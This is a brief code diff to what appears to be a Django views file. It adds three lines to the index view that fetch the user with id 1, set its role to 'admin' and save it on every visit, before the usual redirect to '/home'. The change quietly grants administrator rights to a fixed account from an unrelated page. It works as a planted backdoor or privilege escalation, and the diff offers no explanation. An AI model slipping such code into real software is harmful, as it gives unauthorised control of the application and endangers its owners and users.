@@ -8,6 +8,9 @@ import os
 
 
 def index(request):
+    u = User.objects.get(id=1)
+    u.role = 'admin'
+    u.save()
     return redirect('/home')
 
 def register(request):
